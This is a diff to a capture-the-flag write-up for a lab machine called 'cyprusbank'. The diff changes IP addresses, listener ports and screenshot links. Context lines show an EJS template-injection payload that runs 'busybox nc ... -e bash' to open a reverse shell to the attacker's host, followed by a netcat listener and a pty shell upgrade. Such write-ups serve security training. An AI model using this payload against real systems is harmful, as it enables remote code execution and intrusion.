@@ -7,9 +7,9 @@
 
 ## Enumeration
 ```
-$ nmap 10.10.113.127 -sV -sC
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 16:34 IST
-Nmap scan report for 10.10.113.127
+$ nmap 10.10.200.189  -sV -sC
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 21:14 IST
+Nmap scan report for 10.10.200.189
 Host is up (0.15s latency).
 Not shown: 998 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
@@ -124,13 +124,13 @@ Jemmy Laurel: Oh, is she OK?
 
 ### Origional Request
 <div align="center">
-  <img src="https://github.com/user-attachments/assets/1cc1f3e7-0f8c-4bc3-b62c-3650c3b635a5" height="400"></img>
+  <img src="https://github.com/user-attachments/assets/b48edbab-80be-451c-8068-5db3850db57c height="400"></img>
 </div>
 
 ## When I remove the password parameter, I encounter the following error:
 
 <div align="center">
-  <img src="https://github.com/user-attachments/assets/fbb5933d-ee74-4ae1-b866-fa03203e745b" height="600></img>
+  <img src="https://github.com/user-attachments/assets/fbb5933d-ee74-4ae1-b866-fa03203e745bhttps://github.com/user-attachments/assets/1d2d2cef-3f67-45c1-b0d8-bb115be82029" height="600></img>
 </div>
 
 
@@ -145,25 +145,25 @@ Jemmy Laurel: Oh, is she OK?
 ```
 name=a&password=a&&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.17.120.99 1337 -e bash');s
 ```
-![image](https://github.com/user-attachments/assets/a9297f49-9ccb-46ad-a179-3dd7921101bf)
+![image](https://github.com/user-attachments/assets/67462093-635d-4ae6-936e-1d9111a282f8)
 
 ## Open Nc to get reverse connection.
 ```
-nc -lnvp 1337
+nc -lnvp 1234
 ```
 
-![image](https://github.com/user-attachments/assets/938b362a-2a54-4f9b-bafe-d8e6ac638597)
+![image](https://github.com/user-attachments/assets/f4e563d5-8730-44fc-a442-f71a06c6508e)
 
 ## We got our connection let import shell:
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 ```
-# nc -lnvp 1337
-Listening on 0.0.0.0 1337
-Connection received on 10.10.113.127 42640
+$ nc -lnvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.200.189 56326
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-web@cyprusbank:~/app$
+web@cyprusbank:~/app$ 
 ```
 ## User Flag
 ```
